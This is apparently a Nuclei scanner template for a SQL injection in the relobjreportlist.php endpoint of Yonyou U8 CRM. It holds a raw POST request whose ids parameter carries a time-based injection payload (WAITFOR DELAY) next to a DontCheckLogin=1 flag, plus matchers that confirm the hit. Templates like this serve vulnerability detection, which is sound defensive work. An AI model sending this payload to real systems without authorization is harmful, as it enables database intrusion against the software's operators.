id: yonyou-u8-crm-relobjreportlist-sqli

info:
  name: 用友U8CRM系统接口relobjreportlist.php存在SQL注入漏洞
  author: rj
  severity: high
  tags: 用友-U8-CRM

http:
  - raw:
      - |
        POST /relobjreportlist.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 100
        Connection: close

        DontCheckLogin=1&Action=CheckRelUser&typeID=1&objType=1&ids=1');WAITFOR DELAY '0:0:5'--

    matchers_condition: and
    matchers:
      - type: word
        words:
          - "WAITFOR DELAY"
        condition: and
        part: body
      - type: status
        status:
          - 200